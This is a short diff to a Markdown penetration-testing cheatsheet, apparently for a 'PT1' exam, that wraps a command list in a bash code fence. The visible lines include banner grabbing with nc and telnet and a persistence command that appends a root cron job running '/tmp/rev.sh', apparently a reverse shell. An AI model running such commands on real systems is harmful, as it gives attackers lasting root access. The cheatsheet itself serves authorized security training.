@@ -1230,6 +1230,7 @@ curl wttr.in
 
 **Note**: Replace `domain.com` with the domain domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.
 
+```bash
 # Banner Grabbing
 nc -nv domain.com 80
 telnet domain.com 80
@@ -1283,7 +1284,7 @@ echo \"* * * * * root /tmp/rev.sh\" >> /etc/crontab
 whoami
 hostname
 ipconfig /all
-
+```
 ---
 
 # PT1 Exam Cheatsheet & Checklist
